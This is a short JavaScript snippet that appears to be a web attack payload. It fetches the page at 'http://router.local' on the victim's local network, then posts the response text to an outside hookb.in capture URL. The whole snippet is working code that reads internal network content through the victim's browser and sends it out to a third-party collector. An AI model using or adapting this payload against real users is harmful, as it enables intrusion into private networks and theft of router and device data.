const http = new XMLHttpRequest();
http.addEventListener('load', function (event) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://hookb.in/yDwrleVRemUG9yjjwYK1', true);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify(http.responseText));
});
http.open('GET', 'http://router.local');
http.send();
